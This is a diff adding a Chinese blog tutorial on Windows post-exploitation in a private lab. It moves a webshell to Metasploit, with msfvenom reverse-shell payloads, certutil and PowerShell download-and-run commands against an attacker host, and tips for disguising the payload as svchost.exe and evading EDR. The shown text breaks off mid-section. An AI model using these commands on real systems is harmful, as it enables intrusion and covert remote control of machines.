@@ -1,0 +1,1279 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Windows 提权 | Jasmine_Iris</title><meta name="author" content="Jasmine_Iris"><meta name="copyright" content="Jasmine_Iris"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Windows 本地提权实战：蚁剑转MSF、土豆提权、MS16-032内核漏洞、BypassUAC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Windows 提权">
+<meta property="og:url" content="https://jasmine-iris.top/2026/08/13/Windows-%E6%8F%90%E6%9D%83/index/index.html">
+<meta property="og:site_name" content="Jasmine_Iris">
+<meta property="og:description" content="Windows 本地提权实战：蚁剑转MSF、土豆提权、MS16-032内核漏洞、BypassUAC">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jasmine-iris.top/img/photo.png">
+<meta property="article:published_time" content="2026-08-13T08:00:00.000Z">
+<meta property="article:modified_time" content="2026-08-13T06:33:30.068Z">
+<meta property="article:author" content="Jasmine_Iris">
+<meta property="article:tag" content="提权">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jasmine-iris.top/img/photo.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Windows 提权",
+  "url": "https://jasmine-iris.top/2026/08/13/Windows-%E6%8F%90%E6%9D%83/index/",
+  "image": "https://jasmine-iris.top/img/photo.png",
+  "datePublished": "2026-08-13T08:00:00.000Z",
+  "dateModified": "2026-08-13T06:33:30.068Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Jasmine_Iris",
+      "url": "https://jasmine-iris.top"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/photo.png"><link rel="canonical" href="https://jasmine-iris.top/2026/08/13/Windows-%E6%8F%90%E6%9D%83/index/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css?v=5.5.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.9/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          const mediaQueryDark = window.matchMedia('(prefers-color-scheme: dark)')
+          const mediaQueryLight = window.matchMedia('(prefers-color-scheme: light)')
+
+          if (theme === undefined) {
+            if (mediaQueryLight.matches) activateLightMode()
+            else if (mediaQueryDark.matches) activateDarkMode()
+            else {
+              const hour = new Date().getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            mediaQueryDark.addEventListener('change', () => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else {
+            theme === 'light' ? activateLightMode() : activateDarkMode()
+          }
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"pagination":{"enable":false,"hitsPerPage":8},"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.13.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Windows 提权',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><style>hr{border:none;border-top:1.5px dashed #c0c0c0;margin:1.5em 0;}</style><link rel="stylesheet" href="/css/light-bg.css?v=87"><link rel="stylesheet" href="/css/fix-flash.css?v=6"><style>#article-container h5{font-size:1.1em!important}#article-container h6{font-size:1em!important;font-weight:700!important}</style><meta name="generator" content="Hexo 8.1.2"></head><body><div class="bg-animation" id="web_bg" style="background-image: url(/img/bg.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/photo.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/ loading='lazy'></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">19</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">16</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">17</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/img/post-1.png);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Jasmine_Iris</span></a><a class="nav-page-title" href="/"><span class="site-name">Windows 提权</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">Windows 提权</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-08-13T08:00:00.000Z" title="发表于 2026-08-13 16:00:00">2026-08-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-08-13T06:33:30.068Z" title="更新于 2026-08-13 14:33:30">2026-08-13</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91/">内网</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">总字数:</span><span class="word-count">10.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>38分钟</span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="1-蚁剑-Webshell-转移至-Metasploit"><a href="#1-蚁剑-Webshell-转移至-Metasploit" class="headerlink" title="1. 蚁剑 Webshell 转移至 Metasploit"></a>1. 蚁剑 Webshell 转移至 Metasploit</h1><h2 id="1-1-为什么要转-MSF？"><a href="#1-1-为什么要转-MSF？" class="headerlink" title="1.1 为什么要转 MSF？"></a>1.1 为什么要转 MSF？</h2><p>蚁剑提供基础的文件管理和命令执行，但 Metasploit 的 Meterpreter 提供更强大的后渗透能力：</p>
+<table>
+<thead>
+<tr>
+<th align="center">能力</th>
+<th align="center">蚁剑</th>
+<th align="center">Meterpreter</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">文件管理</td>
+<td align="center">✓</td>
+<td align="center">✓</td>
+</tr>
+<tr>
+<td align="center">命令执行</td>
+<td align="center">✓</td>
+<td align="center">✓</td>
+</tr>
+<tr>
+<td align="center">提权模块</td>
+<td align="center">✗</td>
+<td align="center">✓ (bypassuac, getsystem)</td>
+</tr>
+<tr>
+<td align="center">进程迁移</td>
+<td align="center">✗</td>
+<td align="center">✓</td>
+</tr>
+<tr>
+<td align="center">哈希导出</td>
+<td align="center">✗</td>
+<td align="center">✓ (hashdump, kiwi)</td>
+</tr>
+<tr>
+<td align="center">端口转发</td>
+<td align="center">✗</td>
+<td align="center">✓ (portfwd)</td>
+</tr>
+<tr>
+<td align="center">键盘记录</td>
+<td align="center">✗</td>
+<td align="center">✓</td>
+</tr>
+<tr>
+<td align="center">屏幕截图</td>
+<td align="center">✗</td>
+<td align="center">✓</td>
+</tr>
+<tr>
+<td align="center">持久化</td>
+<td align="center">✗</td>
+<td align="center">✓</td>
+</tr>
+</tbody></table>
+<hr>
+<h1 id="2-如何将-蚁剑-Webshell-转移至-MSF？"><a href="#2-如何将-蚁剑-Webshell-转移至-MSF？" class="headerlink" title="2. 如何将 蚁剑 Webshell 转移至 MSF？"></a>2. 如何将 蚁剑 Webshell 转移至 MSF？</h1><h3 id="前置环境说明"><a href="#前置环境说明" class="headerlink" title="前置环境说明"></a>前置环境说明</h3><p>攻击端：Kali Linux（IP：192.168.23.131）</p>
+<p>目标端：Windows Server 2008 R2 IIS 网站服务器（内网互通）（IP：192.168.23.138）</p>
+<p>目标初始权限：通过上传漏洞拿到 ASPX 一句话木马，可用蚁剑连接</p>
+<h3 id="阶段一：拿到-Web-入口（蚁剑连接）"><a href="#阶段一：拿到-Web-入口（蚁剑连接）" class="headerlink" title="阶段一：拿到 Web 入口（蚁剑连接）"></a>阶段一：拿到 Web 入口（蚁剑连接）</h3><p> Web 入口：<strong>对外开放的网站页面 &#x2F; 网页服务</strong>，是外网唯一能访问到内网的通道  </p>
+<ol>
+<li>利用网站上传漏洞，将一句话木马（aspx 格式）上传至网站可执行目录：<code>C:\inetpub\wwwroot</code>（IIS 默认网站根目录路径）</li>
+<li>蚁剑填入木马访问地址、连接密码，建立连接，连上之后可以：</li>
+</ol>
+<ul>
+<li>文件读写：上传 &#x2F; 下载服务器文件</li>
+<li>终端命令执行：运行 cmd、PowerShell 指令</li>
+</ul>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602634127_raw8pi.webp" loading='lazy'></p>
+<h3 id="阶段二：两种方式获取-Meterpreter"><a href="#阶段二：两种方式获取-Meterpreter" class="headerlink" title="阶段二：两种方式获取 Meterpreter"></a>阶段二：两种方式获取 Meterpreter</h3><p><strong><u>方案 1：生成 exe 上传执行</u></strong></p>
+<p>适用场景：PowerShell 被禁用或 web_delivery 不可用 → 才选择生成 exe 文件上传</p>
+<p><strong>步骤 1：Kali 生成 64 位 Windows 反弹 EXE 载荷，启动监听</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.生成 payload</span></span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=4444 -f exe &gt; payload.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.启动监听</span></span><br><span class="line">msfconsole -q	</span><br><span class="line"><span class="comment"># 3.加载监听模块</span></span><br><span class="line">use exploit/multi/handler	</span><br><span class="line"><span class="comment"># 4.配置载荷、监听IP、端口</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.23.131</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line"><span class="comment"># 5.执行</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602636764_2itb50.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602638433_vh21om.webp" loading='lazy'></p>
+<p><strong>步骤 2：把 payload.exe 传到目标服务器</strong></p>
+<p>蚁剑中操作：</p>
+<p>注：Temp 目录是系统临时文件夹，写入权限默认放开，适合存放恶意程序；</p>
+<p><strong>方式 ①图形界面上传</strong><br>在蚁剑文件管理界面，进入路径 <code>C:\Windows\Temp\</code>，将需要上传的文件拖动到这里。切换到蚁剑终端，输入程序完整路径执行文件。</p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602641264_915n92.webp" loading='lazy'></p>
+<p><strong>方式 ②Kali 启动 Apache2 网页服务，存放文件</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将exe移动到Apache默认网页根目录</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> payload.exe /var/www/html/</span><br><span class="line"><span class="comment"># 启动Apache后台服务</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl start apache2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f <span class="string">&quot;http://192.168.23.131/payload.exe&quot;</span> C:\Windows\Temp\payload.exe</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.23.131/payload.exe&#x27;</span>,<span class="string">&#x27;C:\Windows\Temp\payload1.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602642900_ntkwe5.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602644275_p2ndl2.webp" loading='lazy'></p>
+<p>如果不用 Apache，用 <code>python3 -m http.server 8080</code> 启动简易网页服务，端口就变成 8080，链接要写成 <code>http://192.168.23.131:8080/payload.exe</code>，原理完全一致。  如下：</p>
+<p><strong>方式 ③Python临时HTTP服务</strong></p>
+<p>把生成的 <code>payload.exe</code> 放到任意文件夹里，打开终端进入这个目录。 当前文件夹内所有文件，都能通过 <code>http://KaliIP:端口/文件名</code> 下载。端口 8080 可以随便改  </p>
+<p>执行启动命令：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 开启8080端口网页服务 </span></span><br><span class="line">python3 -m http.server 8080</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602646014_qyqcsx.webp" loading='lazy'></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f <span class="string">&quot;http://192.168.23.131:8080/payload.exe&quot;</span> C:\Windows\Temp\svchost.exe</span><br></pre></td></tr></table></figure>
+
+<p>参数详解：</p>
+<ul>
+<li>certutil：Windows 自带证书工具，用于网络文件下载，不会被基础防火墙拦截</li>
+<li>末尾路径：下载保存位置，命名 svchost.exe 模仿系统进程，降低警惕性</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell (new-object System.Net.WebClient).DownloadFile(<span class="string">&#x27;http://192.168.23.131:8080/payload.exe&#x27;</span>,<span class="string">&#x27;C:\Windows\Temp\svchost1.exe&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602648173_ohvwya.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602649644_kr5ieo.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602651396_araj7l.webp" loading='lazy'></p>
+<blockquote>
+<h2 id="Apache2-vs-Python临时HTTP服务"><a href="#Apache2-vs-Python临时HTTP服务" class="headerlink" title="Apache2  vs Python临时HTTP服务"></a>Apache2  vs Python临时HTTP服务</h2><h3 id="一、基础属性差异"><a href="#一、基础属性差异" class="headerlink" title="一、基础属性差异"></a>一、基础属性差异</h3><ol>
+<li><strong>程序定位</strong></li>
+</ol>
+<p>Apache2：专业成熟的Web服务器软件，Kali系统预装的标准后台服务，多用于搭建正式网站、长期文件共享；<br>Python http.server：Python自带的轻量化临时文件共享工具，仅用来临时传输文件，不属于商用网页服务。<br>2. <strong>默认端口</strong><br>Apache2：标准HTTP 80端口（网页默认端口），访问链接无需填写端口：<br><code>http://192.168.23.131/payload.exe</code><br>Python http.server：默认8080非标准端口，链接必须携带端口号，否则无法访问：<br><code>http://192.168.23.131:8080/payload.exe</code><br>3. <strong>文件存放要求</strong><br>Apache2：有强制固定目录：文件必须移动至 <code>/var/www/html/</code> 目录下才能被下载，操作该文件夹文件需要sudo管理员权限；<br>Python http.server：无固定路径：你在哪个文件夹执行启动命令，哪个文件夹就是下载根目录，生成的载荷文件无需挪动，直接使用即可。</p>
+<h3 id="二、运行生命周期"><a href="#二、运行生命周期" class="headerlink" title="二、运行生命周期"></a>二、运行生命周期</h3><p>Apache：系统级后台常驻服务<br>执行启动命令后，服务挂载在系统后台运行，<strong>关闭终端窗口、注销Kali账户都不会停止</strong>；下次开机可设置自启动，适合反复练习渗透。<br>关闭需要手动输入命令：<code>sudo systemctl stop apache2</code></p>
+<p>Python服务：依附当前终端窗口运行<br>服务进程绑定你打开的黑框终端，<strong>一旦关闭这个终端页面，网页服务瞬间终止</strong>，目标再也无法下载任何文件；用完直接关掉窗口就行，无需手动关闭命令。</p>
+<h3 id="三、相同点"><a href="#三、相同点" class="headerlink" title="三、相同点"></a>三、相同点</h3><ol>
+<li>都可以配合certutil下载exe、也可以给PowerShell拉取ps1脚本；</li>
+<li>下载、反弹Meterpreter、后续提权整套流程逻辑没有区别；</li>
+<li>内网互通环境下，下载速度基本一致。</li>
+</ol>
+</blockquote>
+<p><strong>步骤 3：运行 EXE，获取反弹会话</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Temp\payload.exe</span><br></pre></td></tr></table></figure>
+
+<p>程序运行后，目标主动向外发起 TCP 连接，连接 Kali 4444 端口，msf 监听端收到连接，弹出 Meterpreter 交互窗口。</p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602654090_wlxced.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602655820_a7ivul.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602658143_7g7upy.webp" loading='lazy'></p>
+<p><strong><u>方案 2：PowerShell 无文件落地</u></strong></p>
+<p>脚本仅加载至内存运行，规避磁盘查杀。</p>
+<p><strong>方式①：Kali 生成反射型 PowerShell 脚本</strong></p>
+<p><strong>步骤 1：生成PowerShell payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 攻击机生成 PowerShell payload</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.23.131 LPORT=5555 -f psh-reflection &gt; payload.ps1</span><br></pre></td></tr></table></figure>
+
+<p><code>-f psh-reflection</code>：采用<strong>内存反射 DLL 注入</strong>，代码运行全程不会落地文件到磁盘，全部加载在内存中运行，规避 EDR 磁盘文件查杀；</p>
+<p>普通 <code>-f ps</code> 生成的脚本是明文代码，运行逻辑简单，极易被 EDR 行为规则拦截。</p>
+<p>EDR（Endpoint Detection and Response）：装在 Windows 服务器、电脑本地的<strong>高级安全杀毒软件</strong>，比普通 360、Windows Defender 强大得多，一般企业内网、政企服务器都会部署。 </p>
+<p>普通杀毒：只查<strong>硬盘上的恶意文件</strong>（exe、病毒程序） 。</p>
+<p>EDR：全程监控电脑<strong>所有运行行为、内存操作、进程动作、命令执行。</strong></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602659593_i8fjp7.webp" loading='lazy'></p>
+<p><strong>步骤 2：开启 Apache 网页服务</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 移动文件到apache网站目录（需要sudo）</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">mv</span> payload.ps1 /var/www/html/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 进入网站目录</span></span><br><span class="line"><span class="built_in">cd</span> /var/www/html</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. root权限修改文件权限</span></span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> 777 payload.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 启动apache服务</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl start apache2</span><br><span class="line"></span><br><span class="line"><span class="comment">#补充：关闭apache服务</span></span><br><span class="line"><span class="built_in">sudo</span> systemctl stop apache2</span><br></pre></td></tr></table></figure>
+
+<p>访问地址：<code>http://192.168.23.131/payload.ps1</code></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602661346_6mkqyd.webp" loading='lazy'></p>
+<p><strong>步骤 3：启动监听</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.启动监听</span></span><br><span class="line">msfconsole -q	</span><br><span class="line"><span class="comment"># 2.加载监听模块</span></span><br><span class="line">use exploit/multi/handler	</span><br><span class="line"><span class="comment"># 3.配置载荷、监听IP、端口</span></span><br><span class="line"><span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 192.168.23.131</span><br><span class="line"><span class="built_in">set</span> LPORT 5555</span><br><span class="line"><span class="comment"># 4.执行</span></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><strong>步骤 4：蚁剑终端执行完整 PowerShell 一句话命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -w hidden -exec bypass -c &quot;IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.23.131/payload.ps1&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>详细作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>-nop</code></td>
+<td>不加载用户 PowerShell 配置文件，减少系统日志生成</td>
+</tr>
+<tr>
+<td><code>-w hidden</code></td>
+<td>后台静默运行，不会弹出黑色 PowerShell 窗口</td>
+</tr>
+<tr>
+<td><code>-exec bypass</code></td>
+<td>绕过 Windows 默认 PowerShell 执行策略（系统默认禁止运行脚本）</td>
+</tr>
+<tr>
+<td><code>DownloadString()</code></td>
+<td>从远程 HTTP 地址拉取 ps1 脚本文本内容</td>
+</tr>
+<tr>
+<td><code>IEX</code></td>
+<td>将拉取的字符串在内存中直接解析执行</td>
+</tr>
+</tbody></table>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602663115_wnvf1c.webp" loading='lazy'></p>
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602665115_ftwqao.webp" loading='lazy'></p>
+<p><strong>方式②：使用 web_delivery 的 PowerShell 输出</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 打开MSF控制台</span></span><br><span class="line">msfconsole -q</span><br><span class="line"></span><br><span class="line"><span class="comment"># 快速查找模块</span></span><br><span class="line">search web_delivery</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img.jasmine-iris.top/posts/Windows-%E6%8F%90%E6%9D%83/1786602666828_8upiqy.webp" loading='lazy'></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 加载模块</span></span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line"></span><br><span class="line"><span class="comment"># 选择输出格式</span></span><br><span class="line"><span class="comment"># 查看所有目标编号，确认powershell数字</span></span><br><span class="line">show targets</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定目标：Windows PowerShell内存执行</span></span><br><span class="line"><span class="built_in">set</span> TARGET 2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看全部参数，校验所有配置</span></span><br><span class="line">show options</span><br><span class="line"></span><br><span class="line"><span class="comment"># 